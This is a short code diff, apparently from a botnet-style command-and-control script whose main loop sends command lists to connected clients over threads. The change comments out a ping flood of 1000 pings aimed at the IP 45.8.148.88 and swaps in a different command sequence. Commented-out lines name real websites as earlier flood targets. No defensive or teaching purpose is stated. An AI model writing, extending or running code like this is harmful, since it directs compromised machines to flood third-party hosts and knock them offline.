@@ -129,11 +129,11 @@ def main():
                 #commands = commands_list.pop()
                 #commands = attack_ping("dnschecker.org", 100)
                 #commands_attack = ping_attack("caliente.mx", 1000)
-                commands_attack = ping_attack("45.8.148.88", 1000)
+                #commands_attack = ping_attack("45.8.148.88", 1000)
 
 
                 # Spin up our client thread to handle incoming data
-                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_attack, 0.1, True))
+                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq29, 0.1, True))
                 try:
                     target_handler.start()
                 except:
